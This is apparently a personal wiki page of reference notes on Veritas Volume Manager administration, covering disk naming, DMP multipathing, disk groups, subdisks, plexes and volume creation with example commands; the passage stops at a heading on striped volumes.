The layout of a version 20 DCO volume includes an accumulator that stores the DRL map and a per-region state map for the volume, plus 32 per-volume maps (by default) including a DRL recovery map, and a map for tracking detaches that are initiated by the kernel due to I/O error. The remaining 30 per-volume maps (by default) are used either for tracking writes to snapshots, or as copymaps.

!Hot Relocation
VxVM detects I/O failures on objects and relocates the affected subdisks. The subdisks are relocated to disks designated as spare disks and/or free space within the disk group. VxVM then reconstructs the objects that existed before the failure and makes them accessible again.
When a partial disk failure occurs (that is, a failure affecting only some subdisks on a disk), redundant data on the failed portion of the disk is relocated. Existing volumes on the unaffected portions of the disk remain accessible.

!Volume sets
Volume sets are an enhancement to VxVM that allow several volumes to be represented by a single logical object. All I/O from and to the underlying volumes is directed via the I/O interfaces of the volume set. The volume set feature supports the multi-volume enhancement to Veritas File System (VxFS). This feature allows file systems to make best use of the different performance and availability characteristics of the underlying volumes. For example, file system metadata could be stored on volumes with higher redundancy, and user data on volumes with better performance.

!Disk Naming
There are two different methods of naming disk devices:
* hdx and sdx based naming
* Enclosure based naming

!!!!hdx and sdx based naming
In this naming scheme, all disk devices are named using the hdx[N] or sdx[N] format, where x is a letter that indicates the order of EIDE (hd) or SCSI (sd) disks seen by the operating system, and N is an optional partition number in the range 1 through 15.

!!!!Enclosure Based Naming
Enclosure-based naming operates as follows:
* Devices with very long device names (for example, Fibre Channel devices that include worldwide name (WWN) identifiers) are always represented by enclosure-based names.
* All disks in supported disk arrays are named using the enclosure_name_# format. For example, disks in the supported disk array, enggdept are named enggdept_0, enggdept_1, enggdept_2 and so on. 
* Disks in the DISKS category (JBOD disks) are named using the Disk_# format.
* A disk partition is indicated by appending s# to the name, where # is the partition number. For example, Disk_0s5 and Disk_0s6 indicate the extended partitions that are used for the private and public regions of the sliced disk, Disk_0.
* Disks in the OTHER_DISKS category (disks that are not multipathed by DMP) cannot use this scheme, and are named using the hdx[N] or sdx[N] format.

To display native os device name
{{{
# vxdisk path | egrep &lt;diskname&gt;
}}}

To change disk-naming scheme
{{{
# To set enclosure-based naming scheme
vxddladm set namingscheme=ebn [persistence=yes|no]

# To set OS based naming scheme
vxddladm set namingscheme=osn [persistence=yes|no]

# To get the current naming scheme
vxddladm get namingscheme

# To convert DA (disk access) name to DM (disk media/OS) names
vxdmpadm getsubpaths dmpnodename=&lt;da_name&gt;
}}}

!Disk Regions
Most VM disks have two regions:

!!!!private region 
A small area where configuration information is stored. A disk header label, configuration records for VxVM objects (such as volumes, plexes and subdisks), and an intent log for the configuration database are stored here. The default private region size is 32 megabytes, which is large enough to record the details of several thousand VxVM objects in a disk group.
Each disk that has a private region holds an entire copy of the configuration database for the disk group. The size of the configuration database for a disk group is limited by the size of the smallest copy of the configuration database on any of its member disks.

!!!!public region 
An area that covers the remainder of the disk, and which is used for the allocation of storage space to subdisks

!Disk Typ
A disk's type identifies how VxVM accesses a disk, and how it manages the disk's private and public regions. The following disk access types are used by VxVM:

!!!!simple
The public and private regions are both configured on a single extended partition, such as partition 5, with the public area following the private area. The partition number (displayed as # or s#, depending on the naming scheme) is always displayed in command output for simple disks.

!!!!sliced
The private and public regions are configured on different extended partitions: partition 5 for the private region, and partition 6 for the public region.

!!!!nopriv
There is no private region (only a public region for allocating subdisks). This is the simplest disk type consisting only of space for allocating subdisks. Such disks are most useful for defining special devices (such as RAM disks, if supported) on which private region data would not persist between reboots. They can also be used to encapsulate disks where there is insufficient room for a private region. 

!!!!auto 
When the vxconfigd daemon is started, VxVM obtains a list of known disk device addresses from the operating system and configures disk access records for them automatically.

Auto-configured disks (with disk access type auto) support the following disk formats:
* cdsdisk - The disk is formatted as a Cross-platform Data Sharing (CDS) disk that is suitable for moving between different operating systems. This is the default format for disks that are not used to boot the system.Typically, most disks on a system are configured as this disk type. However, it is not a suitable format for boot, root or swap disks, for mirrors or hot-relocation spares of such disks, or for Extensible Firmware Interface (EFI) disks. Also note that partition 3 is used for both the private and public regions of a CDS disk.
* simple - The disk is formatted as a simple disk that can be converted to a CDS disk.
* sliced - The disk is formatted as a sliced disk. This format can be applied to disks that are used to boot the system. The disk can be converted to a CDS disk if it was not initialized for use as a boot disk.

!Discovering new devices
vxdisk scandisks or vxdctl enable command can be used to discover devices. The commands also trigger chnages in DMP configuration. 
{{{
# To discover all devices added to the system, does not require reboot
vxdisk scandisks or vxdctl enable


# To discover only new devices added to the system, or devices that were in enabled or disable 
vxdisk -f scandisks or vxdctl -f enable


# To discover only new devices added to the system
vxdisk scandisks new


# To discover only fabric devices
vxdisk scandisks fabric


# To discover only specific devices 
vxdisk scandisks device=sdm,sdn
vxdisk scandisks ctrl=c1,c2  # logical controller
vxdisk scandisks pctrl=c1+c2 # physical controller


# To discover all devices except specific devices
vxdisk scandisks \!device=sdm,sdn
vxdisk scandisks \!ctrl=c1,c2  # logical controller
vxdisk scandisks \!pctrl=c1+c2 # physical controller
}}}

!Device Discovery Layer
{{{
# To list the supported disk arrays
vxddladm listsupport all


# To list the details of a specific library
vxddladm listsupport libname=libvxfujitsu.so


# To exclude support for a disk array
vxddladm excludearray libname=libvxemc.so
vxddladm excludearray [vid=vendor-id] [pid=product-id]


# To include support for a disk array
vxddladm includearray libname=libvxemc.so
vxddladm includearray [vid=vendor-id] [pid=product-id]

# To list all the excluded arrays
vxddladm listexclude

# To list the supported disks in DISKS category
vxddladm listjbod
}}}

Manually adding unsupported disks to DISKS
{{{
# Find the vendor and product id of the device 
/etc/vx/diag.d/vxdmpinq /dev/sda

# To add a new JBOD category
vxddladm addjbod vid=&lt;vendorid&gt; pid=&lt;productid&gt; [length=&lt;serialno_length&gt;]

# To remove a jBOD category
vxddladm rmjbod vid=&lt;vid&gt; [pid=&lt;pid&gt;]
}}}

To add foreign devices which are contorlled by third-party drivers, such as those that provide multipathing or RAM disks
{{{
# To add a foreign device to ddl
vxddladm addforeign [blockdir=/dev/foo/dsk chardir=/dev/foo/rdsk]
}}}

Additional DDL commands provided in MP3
{{{
# To list all the devices
vxddladm list

# To list all the HBAs and iSCSI adapters
vxddladm list hbas

# To list the ports configured on HBAs
vxddladm list ports

# To list the configured targets on a HBA
vxddladm list targets
vxddladm list targets [hba=&lt;hba_name&gt; | port=&lt;port_name&gt;]

# To list the devices on a HBA or target
vxddladm list devices [target=&lt;target_name&gt;]

# To set/get iSCSI operational parameters
vxddladm getiscsi target=&lt;target_name&gt; {all | &lt;parameter&gt;}
vxddladm setiscsi target=&lt;target_name&gt; &lt;parameter&gt;=&lt;value&gt;
}}}

Disk administration commands
{{{
# To list the disk that are known to VxVM(need not be under VM control)
vxdisk list

# To display detailed information about a individual disk
vxdisk -v list &lt;diskname&gt;

# To add a uninitalised disk to VxVM control
vxdisk [[-o coordinator] -f] init &lt;disk_name&gt; 
		type={simple | sliced | auto [format={simple|sliced|cdsdisk}} [attribute]
# If the above command fails, try to initalise the disk manually and try 
# the step again
fdisk /dev/sdb
Command (m for help): o 
Command (m for help): w
vxdisk [[-o coordinator] -f] init &lt;disk_name&gt; 
		type={simple | sliced | auto [format={simple|sliced|cdsdisk}} [attribute]


# To remove the disk from VxVM control, (the disk should not be part of any DG)
vxdiskunsetup sdb


# To rename a disk 
vxedit [-g &lt;dg&gt;] rename &lt;old_name&gt; &lt;new_name&gt;

# To reserve a disk for special purposes 
vxedit [-g &lt;dg&gt;] set reserve=on &lt;diskname&gt;

# To remove a reservation
vxedit [-g &lt;dg&gt;] set reserve=off &lt;disk_name&gt;

}}}

To encapsulate a disk 
* The disk should have atleast 2 partitions one for storing private region, other for public.
* The private region would require 32MB of free space at the start or end of the disk. 
Follow the prompts in vxdiskadm to encapsulate a disk 

nopriv disk can be used to encapsulate a partition for use with VxVM
{{{
vxdisk define sda3 type=norpiv
}}}

If a LUN expanded/shrunk on the array side, VxVM can be asked identify the new size. Size changes should be done only at the last byte of the lun not the first byte. If a shrink can be accomodated without any disrupion to plexes the shrink is performed. 
To notify VxVM of expand/shrink to a LUN
{{{
vxdisk [-f] [-g diskgroup] resize {accessname|medianame} \ [length=value]
}}}

!Extended Copy service
The Extended Copy Service feature of VxVM works in tandem with the extended copy engines from array vendors. When VxVM detects that the source and destination devices are enabled for extended copy, VxVM automatically off loads copy requests to the arrays copy manager.

To see whether the Extended Copy Service feature is enabled on a disk, use the
vxprint command as shown in the following example. The feature is enabled if
an ecopy_enabled entry appears in the flags line.
{{{
# vxprint -l disk03
Disk group: rootdg
Disk: disk03
info: diskid=1234567890.59.vm250e1.veritas.com
assoc: device=c2t2d0s2 type=auto
flags: autoconfig ecopy_enabled
device: path=/dev/vx/dmp/c2t2d0s4
devinfo: publen=35354136 privlen=9167
}}}

!DMP

Array types are
!!!Active/Active
An Active/Active disk array (A/A arrays) permits several paths to be used concurrently for I/O. In the event that one path fails, DMP automatically routes I/O over the other available paths.
A/A-A or Asymmetric Active/Active arrays can be accessed through secondary storage paths with little performance degradation. Usually an A/A-A array behaves like an A/P array rather than an A/A array. However, during failover, an A/A-A array behaves like an A/A array.

!!!Active/Passive
An Active/Passive array (A/P array) allows access to its LUNs via the primary (active) path on a single controller (also known as an access port or a storage processor) during normal operation.
In implicit failover mode (or autotrespass mode), an A/P array automatically fails over by scheduling I/O to the secondary (passive) path on a separate controller if the primary path fails. This passive port is not used for I/O until the active port fails. In A/P arrays, path failover can occur for a single LUN if I/O fails on the primary path.
For Active/Passive arrays with LUN group failover (A/PG arrays), a group of LUNs that are connected through a controller is treated as a single failover entity. Unlike A/P arrays, failover occurs at the controller level, and not for individual LUNs. The primary and secondary controller are each connected to a separate group of LUNs. If a single LUN in the primary controllers LUN group fails, all LUNs in that group fail over to the secondary controller.
Active/Passive arrays in explicit failover mode (or non-autotrespass mode) are termed A/PF arrays. DMP issues the appropriate low-level command to make the LUNs fail over to the secondary path.
A/P-C, A/PF-C and A/PG-C arrays are variants of the A/P, AP/F and A/PG array types that support concurrent I/O and load balancing by having multiple primary paths into a controller. This functionality is provided by a controller with multiple ports, or by the insertion of a SAN hub or switch between an array and a controller. Failover to the secondary (passive) path occurs only if all the active primary paths fail.

!!!Load Balancing
For Active/Passive disk arrays, I/O is sent down the primary path. If the primary path fails, I/O is switched over to the other available primary paths or secondary paths. As the continuous transfer of ownership of LUNs from one controller to another results in severe I/O slowdown, load balancing across paths is not performed for Active/Passive disk arrays unless they support concurrent I/O.
Both paths of an Active/Passive array are not considered to be on different controllers when mirroring across controllers (for example, when creating a volume using vxassistmake specified with the mirror=ctlr attribute).
For A/P-C, A/PF-C and A/PG-C arrays, load balancing is performed across all the currently active paths as is done for Active/Active arrays.


!!!DMP Monitoring
DMP maintains a pool of kernel threads that are used to perform such tasks as error processing, path restoration, statistics collection, and SCSI request callbacks. The vxdmpadmstat command can be used to provide information about the threads. The names errord and restored have been retained for backward compatibility.
One kernel thread responds to I/O failures on a path by initiating a probe of the host bus adapter (HBA) that corresponds to the path. Another thread then takes the appropriate action according to the response from the HBA. The action taken can be to retry the I/O request on the path, or to fail the path and reschedule the I/O on an alternate path.
The restore kernel thread is woken periodically (typically every 5 minutes) to check the health of the paths, and to resume I/O on paths that have been restored. As some paths may suffer from intermittent failure, I/O is only resumed on a path if has remained healthy for a given period of time.

!!!I/O Throttling
If I/O throttling is enabled, and the number of outstanding I/O requests builds up on a path that has become less responsive, DMP can be configured to prevent new I/O requests being sent on the path either when the number of outstanding I/O requests has reached a given value, or a given time has elapsed since the last successful I/O request on the path. While throttling is applied to a path, the outstanding I/O requests on that path are scheduled on other available paths. The throttling is removed from the path if the HBA reports no error on the path, or if an outstanding I/O request on the path succeeds

!!!DMP in clustered environment
In a clustered environment where Active/Passive type disk arrays are shared by multiple hosts, all nodes in the cluster must access the disk via the same physical path. Accessing a disk via multiple paths simultaneously can severely degrade I/O performance (sometimes referred to as the ping-pong effect). Path failover on a single cluster node is also coordinated across the cluster so that all the nodes continue to share the same physical path.
For Active/Active type disk arrays, any disk can be simultaneously accessed through all available physical paths to it. In a clustered environment, the nodes do not all need to access a disk via the same physical path.

!!!Enabling/Disabling I/O to controller/ports/SPs/paths
DMP allows you to turn off I/O for a controller or the array port of a storage processor so that you can perform administrative operations. This feature can be used for maintenance of HBA controllers on the host, or array ports that are attached to disk arrays supported by VxVM. I/O operations to the controller or array port can be turned back on after the maintenance task is completed. You can accomplish these operations using the vxdmpadm command provided with VxVM.
In Active/Active type disk arrays, VxVM uses a balanced path mechanism to schedule I/O to multipathed disks. As a result, I/O may go through any available path at any given point in time. For example, if a system has an Active/Active storage array, and you need to change an interface board that is connected to this disk array (if supported by the hardware), you can use the vxdmpadm command to list the controllers that are connected to the interface board. Disable the controllers to stop further I/O to the disks that are accessed through the interface board. You can then replace the board without causing disruption to any ongoing I/O to disks in the disk array.
In Active/Passive type disk arrays, VxVM schedules I/O to use the primary path until a failure is encountered. To change the interface card for an array port or an HBA controller card on the host (if supported by the hardware) that is connected to the disk array, disable I/O operations to the array port or to the HBA controller. This shifts all I/O over to an active secondary path or to an active primary path on another controller so that you can change the hardware.
After the operation is over, you can use vxdmpadm to re-enable the paths through the controllers.

{{{
vxdmpadm [-c | -f] disable {ctlr=&lt;&gt; | enclosure=&lt;&gt; portid=&lt;&gt; | path=&lt;&gt; | pwwn=&lt;&gt;}
	       [enclosure=&lt;&gt;] [type=&lt;&gt;]

vxdmpadm [-c | -f] enable {ctlr=&lt;&gt; | enclosure=&lt;&gt; portid=&lt;&gt; | path=&lt;&gt; | pwwn=&lt;&gt;}
	       [enclosure=&lt;&gt;] [type=&lt;&gt;]
}}}

!!!Enabling/Disabling multipathing and making devices invisible to VxVM
You can use vxdiskadm menu options 17 and 18 to disable or enable multipathing. These menu options also allow you to exclude or exclude devices from the view of VxVM.

!!!Renaming DMP node names (DA names)/Enclosures
User specified names are persistent even if names persistenece is turned off.

{{{
vxdmpadm setattr dmpnode &lt;dmpnodename&gt; name=&lt;new_name&gt;
vxdmpadm setattr enclosure &lt;encl_name&gt; name=&lt;new_name&gt;

# To assign names from a file
vxddladm assing names file=&lt;pathname&gt;
}}}

!!!Administering vxdmpadm
{{{
# To get OS names (DM name) from dmpnodename(DA name)
vxdmpadm getdmpnode nodename=&lt;os_name&gt;
vxdmpadn getdmpnode nodenmae=sda
vxdmpadm getdmpnode enclosure=&lt;encl_name&gt;

# To get dmpnodename(DA name) from OS names(DM names)
vxdmpadm getsubpaths dmpnodename=&lt;&gt;
vxdmpadm getsubpaths dmpnodename=Disk_1
vxdmpadm getsubpaths [ctlr=&lt;&gt; | dmpnodename=&lt;&gt; | enclosure=&lt;&gt; portid=&lt;&gt; | pwwn=&lt;&gt; | tpdnodename=&lt;&gt;]


# To get the DMP nodes that are there in the same LUN group as a specified node
vxdmpadm getlungroup dmpnodename=&lt;&gt;

# To list the information about the controllers
vxdmpadm listctlr { all | ctlr=&lt;&gt; | enclosure=&lt;&gt; | type=&lt;&gt; }

# To list the enclosures 
vxdmpadm listenclosure { all | &lt;enclosure_name&gt; }

# To display information about the portids
vxdmpadm getportids { path=&lt;os_path&gt; | ctlr=&lt;&gt; | dmpnodename=&lt;&gt; | enclosure=&lt;&gt; }

# To display information about TPD controlled devices
vxdmpadm gettpdnode [nodename=&lt;&gt;]

# To display extended attributes 
vxdisk -p list


# DMP I/O statistics
# To turn on io statistics collection
vxdmpadm iostat start [memory=&lt;size&gt;]
vxdmpadm iostat reset
vxdmpadm iostat stop
# To see the current statistics
vxdmpadm iostat show {all | ctlr=&lt;&gt; | enclosure=&lt;&gt; | dmpnodename=&lt;&gt; | pathname=&lt;&gt;}
                     [interval=&lt;seconds&gt; [count=&lt;n&gt;]]


# DMP path attributes
vxdmpadm setattr path &lt;path_name&gt; pathtype={primary | secondary | nomanual|
			standby | active | nopreferred | preferred [priority=N]}
vxdmpadm getattr path &lt;path_name&gt; pathtype
# active - changes a path to an active path ( for A/P-C)
# nomanual - restores the original primary or secondary attributes of the path
# preferred - specifies the path as preferred with priority(0 is low) (for A/A)
# nopreferred - restores the normal prirority of the path (for A/A)
# primary - defines the path as primary path (for A/P)
# secondary - defines the path as secondary path (for A/P)
# standby - defines the path for failover (for A/P-C)


# DMP I/O Policies
vxdmpadm setattr {enclosure enclr_name | arrayname array_name |
                  arraytype {A/A|A/P|...}} iopolicy=&lt;&gt; [use_all_paths={yes|no}]
# Defined I/O polices in DMP are
# adaptive - 
#            This policy attempts to maximize overall I/O throughput 
#            from/to the disks by dynamically scheduling I/O on the paths. 
#	     It is suggested for use where I/O loads can vary over time.
# balanced [partitionsize=&lt;size&gt;] - 	     
#            This policy is designed to optimize the use of caching in 
#            disk drives and RAID controllers. The size of the cache typically
#            ranges from 120KB to 500KB or more, depending on the 
#            characteristics of the particular hardware. During normal 
#            operation, the disks (or LUNs) are logically divided into a 
#            number of regions (or partitions), and I/O from/to a given region
#            is sent on only one of the active paths. Should that path fail, 
#            the workload is automatically redistributed across the remaining 
#            paths. You can use the size argument to the partitionsize 
#            attribute to specify the partition size.
#            The default value for the partition size is 2048 blocks (1MB). 
# minimumq -
#            sends I/O on paths that have the minimum number of outstanding I/O 
# priority -
# round-robin - 
# singleactive -
# use_all_paths - whether I/O requests are to be scheduled on the secondary 
#                 paths in addition to the primary paths of an Asymmetric 
#                 Active/Active (A/A-A) array.
#                 It has no effect for array types other than A/A-A.


# DMP response to I/O failures
vxdmpadm setattr {enclosure &lt;&gt; | arrayname &lt;&gt; | arraytype {A/A|A/P|...}} 
                 recoveryoption={fixedretry retrycount=N |
                                 timebound iotimeout=secs |
                                 default}
vxdmpadm getattr {enclosure &lt;&gt; | arrayname &lt;&gt; | arraytype {A/A|A/P|...}} 
                 recoveryoption
# fixedretry - retry for retrycount times before rescheduleing on another path
# timebound - wait for iotimeout seconds before reschedueling on another path
vxdmpadm setattr {enclosure &lt;&gt; | arrayname &lt;&gt; | arraytype {A/A|A/P|...}} 
                 recoveryoption=throttle {iotimeout=seconds | queuedepth=N}


# DMP threads
# DMP restore thread, examines the conditions of paths at a specified interval
vxdmpadm start restore [interval=&lt;secs&gt;] 
                       policy={check_all | check_alternate | check_disabled|
                               check_periodic [period=&lt;n&gt;]}
vxdmpadm stat restored
vxdmpadm stat errord
vxdmpadm stop restore
# check_alternate - check if atleast one used and one alternate path is 
#                   available, sends a notification otherwise
# check_periodic - do check_all every &lt;period&gt; cycles, and check_disabled
#                  during every cycle


# DMP array policy modules
# An array policy module(APM) is a dynamically loadable kernel module that
#    may be provided by some vendors for use in conjunction with an array. 
# An APM defines procedures to:
#      Select an I/O path when multiple paths to a disk within the array are available.
#      Select the path failover mechanism.
#      Select the alternate path in the case of a path failure.
#      Put a path change into effect.
#      Respond to SCSI reservation or release requests.
# DMP supplies default procedures for these functions when an array is registered. 
# An APM may modify some or all of the existing procedures that are provided 
#    by DMP or by another version of the APM.
vxdmpadm listapm all
# The output from this command includes the file name of each module, 
#     the supported array type, the APM name, the APM version, and whether 
#     the module is currently in use (loaded).
vxdmpadm listapm module_name
# To add and configure an APM, use the following command:
vxdmpadm -a cfgapm &lt;module_name&gt; [attr1=value1 [attr2=value2...]]
# To delete a configured APM
vxdmpadm -r cfgapm &lt;module_name&gt;
# To use an older version of APM
vxdmpadm -u cfgapm &lt;module_name&gt;

}}}

!Disk groups
Disk groups are named collections of disks that share a common configuration. Volumes are created within a disk group and are restricted to using disks within that disk group.
When a disk is added to a disk group, it is given a name (for example, mydg02). This name identifies a disk for operations such as volume creation or mirroring. The name also relates directly to the underlying physical disk. If a physical disk is moved to a different target address or to a different controller, the name mydg02 continues to refer to it.
Having disk groups that contain many disks and VxVM objects causes the private region to fill. In the case of large disk groups that are expected to contain more than several hundred disks and VxVM objects, disks should be set up with larger private areas. A major portion of a private region provides space for a disk group configuration database that contains records for each VxVM object in that disk group. Because each configuration record takes up approximately 256 bytes, the number of records that can be created in a disk group can be estimated from the configuration database copy size. The copy size in blocks can be obtained from the output of the command vxdglist diskgroup as the value of the permlen parameter on the line starting with the string config:. This value is the smallest of the len values for all copies of the configuration database in the disk group. The amount of remaining free space in the configuration database is shown as the value of the free parameter.

!!!Reserved disk group names
* bootdg - To get 'vxdg bootdg'.
* defaultdg - To get, 'vxdg defaultdg'. To set 'vxdctl defaultdg &lt;dg_name&gt;
* nodg - Specifies to an operation that no disk group has been defined. For example, if the root disk is not under VxVM control, bootdg is set to nodg. By default, defaultdg is set to nodg.

!!!Disk group administration
{{{
# To list diskgroups information
vxdg list
vxdg list &lt;dg_name&gt;

# free space in a dg
vxdg free
vxdg -g free &lt;dg_name&gt;

# To set cds on a disk group/dg
vxdg init &lt;dg_name&gt; [cds=on|off] ...
vxdg -g &lt;dg_name&gt; set cds=on|off

# To add/remove a disk to dg
vxdg -g &lt;dg_name&gt; [-f] adddisk &lt;DA_name&gt;
vxdg -g &lt;dg_name&gt; rmdisk &lt;DA_name&gt;
vxdg -g &lt;dg_name&gt; -k rmdisk &lt;DA_name&gt;   # to remove sub-disks if exist

# To import/deport a dg
vxdg import &lt;dg_name&gt;
vxdg deport &lt;dg_name&gt;

# To rename a dg, this can done only during import/deport
vxdg -n &lt;new_name&gt; import &lt;old_name&gt;
vxdg -t -n &lt;new_name&gt; import &lt;old_name&gt;   # old name exists only for this import
vxdg -n &lt;new_name&gt; deport &lt;old_name&gt;

# Moving diskgroups from one system to other
vxdg deport &lt;dg&gt;  # on the first system
vxdg import &lt;dg&gt; # new system
vxrecover -g &lt;dg_name&gt; -sb

# Moving diskgroups from one system to other, when the first has failed
# and we cannot deport from the first system
vxdg -C import &lt;dg_name&gt;      # clear all lock files
# or
vxdisk clearimport &lt;da_name&gt;  # for all disks, then
vxdg import &lt;dg_name&gt;

# To import a disk group when some of the disks are not available
vxdg -f import &lt;&gt;

!Minor number allocation in VxVM
VxVM assigns unique device minor numbers to each object (volume, plex, subdisk, disk, or disk group) that it controls. When you move a disk group between systems, it is possible for the minor numbers that it used on its previous system to coincide (or collide) with those of objects known to VxVM on the new system. To get around this potential problem, you can allocate separate ranges of minor numbers for each disk group. 

VxVM chooses minor device numbers for objects created from this disk group starting at the base minor number base_minor. Minor numbers can range from this value up to 65,535 on 2.6 and later kernels. VxVM reserves the range of minor numbers from 0 to 999 for use with volumes in the boot disk group.  If you do not specify the base of the minor number range for a disk group, VxVM chooses one at random. The number chosen is at least 1000, is a multiple of 1000, and yields a usable range of 1000 device numbers.

{{{
# To view the base minor number for an existing disk group
vxprint -l mydg | egrep minors
minors: &gt;=45000
vxprint -g mydg -m | egrep base_minor
base_minor=45000

# To set a base volume device minor number for a disk grou
vxdg init diskgroup minor=base_minor disk_access_name ...

# If a dg already exists, use the vxdgreminor command to change base minor number:
vxdg -g diskgroup reminor new_base_minor
}}}

!Destroying a DG
The vxdg command provides a destroy option that removes a disk group from the system and frees the disks in that disk group for reinitialization: 
{{{
vxdg destroy diskgroup
}}}
If a disk group has been accidentally destroyed, you can recover it, provided that the disks that were in the disk group have not been modified or reused elsewhere.
{{{
vxdisk -s list disk_access_name 
# The disk must be specified by its disk access name, such as sdc.
# Examine the output from the command for a line similar to the 
# following that specifies the disk group ID.
dgid: 963504895.1075.bass
# Use the disk group ID to import the disk group: 
vxdg import dgid
}}}

!vxconfigd
The VxVM configuration daemon (vxconfigd) provides the interface between VxVM commands and the kernel device drivers. vxconfigd handles configuration change requests from VxVM utilities, communicates the change requests to the VxVM kernel, and modifies configuration information stored on disk. vxconfigd also initializes VxVM when the system is booted.
The vxdctl command is the command-line interface to the vxconfigd daemon.

!Adminstering subdisks
{{{
# To create a subdisk
vxmake [-g diskgroup] sd &lt;subdisk_name&gt; &lt;diskname&gt;,&lt;offset&gt;,&lt;length&gt;
vxmake -g mydg sd mydg02-01 mydg02,0,8000  # sectors
vxmake -g mydg sd mydg02-01 mydg02,0,8000k  # 8000KB

# To display information about sub-disks
vxprint -st
vxprint [-g &lt;dg&gt;] -l &lt;subdisk_name&gt;

# Moving subdisk copies the disk space contents of a subdisk onto one or more 
# other subdisks. If the subdisk being moved is associated with a plex, then 
# the data stored on the original subdisk is copied to the new subdisks. 
# The old subdisk is dissociated from the plex, and the new subdisks are 
# associated with the plex.
vxsd [-g diskgroup] mv &lt;old_subdisk&gt; &lt;new_subdisk&gt; [&lt;new_subdisk&gt; ...]
vxsd -g mydg mv mydg03-01 mydg12-01 mydg12-02

# Splitting a subdisk divides an existing subdisk into two separate subdisks.
# The -s option is required to specify the size of first subdisk to be created.
vxsd [-g diskgroup] s &lt;size&gt; split &lt;subdisk&gt; &lt;newsd1&gt; &lt;newsd2&gt;
vxsd -g mydg -s 500m split mydg03-02 mydg03-02 mydg03-03

# Joining subdisks combines two or more existing subdisks into one subdisk. 
# To join subdisks, the subdisks must be contiguous on the same disk.
vxsd [-g diskgroup] join subdisk1 subdisk2 ... new_subdisk
vxsd -g mydg join mydg03-02 mydg03-03 mydg03-04 mydg03-05 mydg03-02

# Creating plex from subdisks
vxmake [-g diskgroup] plex &lt;plex_name&gt; sd=&lt;subdisk&gt;,...
vxmake -g mydg plex home-1 sd=mydg02-01,mydg02-00,mydg02-02

# To associate one or more subdisks with an existing plex
vxsd [-g diskgroup] [-l offset] assoc &lt;plex&gt; &lt;subdisk1&gt; [&lt;subdisk2&gt; ...]
vxsd -g mydg assoc home-1 mydg02-01 mydg02-00 mydg02-01
# The -l option is required if you previously created a sparse plex. 

# to add M subdisks at end of each of N columns in a striped or RAID-5 volume
vxsd [-g diskgroup] assoc plex subdisk1:0 ... subdiskM:N-1
vxsd -g mydg assoc vol01-01 mydg10-01:0 mydg11-01:1 mydg12-01:2

# To add a log subdisk to an existing plex
vxsd [-g diskgroup] aslog &lt;plex&gt; &lt;subdisk&gt;
# To add a log subdisk to an existing volume 
vxassist [-g diskgroup] addlog &lt;volume&gt; &lt;disk&gt;

# To remove a subdisk from a plex
vxsd [-g diskgroup] [-o force] dis &lt;subdisk&gt;
vxsd -g mydg dis mydg02-01

# remove a subdisk from VxVM
vxedit [-g diskgroup] rm &lt;subdisk&gt;
vxedit -g mydg rm mydg02-01
}}}

!Adminstering plexes
{{{
# To create a plex from existing subdisks, use the following command: 
vxmake [-g diskgroup] plex plex sd=subdisk1[,subdisk2,...]
vxmake -g mydg plex vol01-02 sd=mydg02-01,mydg02-02

# To create a striped plex
vxmake -g mydg plex pl-01 layout=stripe stwidth=32 ncolumn=2 \
sd=mydg01-01,mydg02-01

# To get the plex information
vxprint -lp
vxprint -l &lt;plex&gt;
vxprint -pt  # lists free plexes

# VxVM utilities use plex states to:
## indicate whether volume contents have been initialized to a known state
## determine if a plex contains a valid copy (mirror) of the volume contents
## track whether a plex was in active use at the time of a system failure
## monitor operations on plexes

# To create a mirrored&lt;-volume from a plex
vxmake -g mydg -U fsgen vol home plex=home-1,home-2
# To attach a plex to an existing volume
vxplex -g mydg att vol01 vol01-02
# To detach a plex from a volume
vxplex -g mydg det vol01-02

# To offline a plex
vxmend -g mydg off vol01-02 vol02-02
# To online a plex after repairing
vxmend -g mydg on vol01-02

# Move one plex to another (contents are copied to new plex)
vxplex [-g diskgroup] mv &lt;original_plex&gt; &lt;new_plex&gt;

# To copy the contents of one plex to another 
vxplex [-g diskgroup] cp &lt;volume&gt; &lt;new_plex&gt;
}}}
!Adminstering volumes
{{{
vxassist [options] keyword volume [attributes...]
vxassist [options] make &lt;volume&gt; &lt;length&gt; [attributes..]

# default values fo ravxasist in /etc/default/vxassist

vxassist help showattrs

# To find out how large a volume you can create within a disk group, 
# use the following form of the vxassist command: 
vxassist [-g diskgroup] maxsize layout=&lt;layout&gt; [attributes]
vxassist -g dgrp maxsize layout=raid5 nlog=2
vxassist -b -g dgrp maxsize layout=raid5 nlog=2 \!dgrp07 \ \!dgrp08
# The -b option makes VxVM carry out any required initialization as a
# background task.

# If a volume is created in a disk group that is compatible with the 
# Cross-platform Data Sharing (CDS) feature, the volumes length and the 
# values of volume attributes that define the sizes of objects such as logs 
# or stripe units, must be an integer multiple of the alignment value of 
# 16 blocks (8 kilobytes). If the disk group is not compatible with the CDS 
# feature, the volumes length and attribute size values must be multiples of 
# 1 block

# To discover the value in blocks of the alignment that is set on a disk group, 
# use this command: 
vxprint -g diskgroup -G -F %align

# to create the concatenated volume vol1 with a length of 10 gigabytes in the 
# default disk group:
vxassist -b make vol1 10g

# To create a volume on a specific disk or disks, use the following command:
vxassist [-b] [-g diskgroup] make volume length \ [layout=layout] diskname ...
vxassist -b -g mydg make volspec 5g mydg03 mydg04
vxassist -b -g mydg make volspec 5g \!mydg05
vxassist -b -g mydg make volspec 5g \!ctlr:c2

# Ordered allocation gives you complete control of space allocation. It 
# requires that the number of disks that you specify to the vxassist command 
# must match the number of disks that are required to create a volume.
# the following command creates a mirrored-stripe volume with 3
# columns and 2 mirrors on 6 disks in the disk group, mydg:
vxassist -b -g mydg -o ordered make mirstrvol 10g layout=mirror-stripe ncol=3 mydg01 mydg02 mydg03 mydg04 mydg05 mydg06
# This command places columns 1, 2 and 3 of the first mirror on disks mydg01,
# mydg02 and mydg03 respectively, and columns 1, 2 and 3 of the second mirror
# on disks mydg04, mydg05 and mydg06 respectively.


# To create a new mirrored volume, use the following command:
vxassist [-b] [-g diskgroup] make volume length layout=mirror [nmirror=number] [init=active]
vxassist -b -g mydg make volmir 5g layout=mirror
vxassist -b -g mydg make volmir 5g layout=mirror nmirror=3

# A mirrored-concatenated volume mirrors several concatenated plexes. To create
# a concatenated-mirror volume, use the following command:
vxassist [-b] [-g diskgroup] make volume length \ layout=mirror-concat [nmirror=number]

# A concatenated-mirror volume is an example of a layered volume which
# concatenates several underlying mirror volumes. To create a concatenated-
# mirror volume, use the following command:
vxassist [-b] [-g diskgroup] make volume length layout=concat-mirror [nmirror=number]


# To create a striped volume, use the following command: 
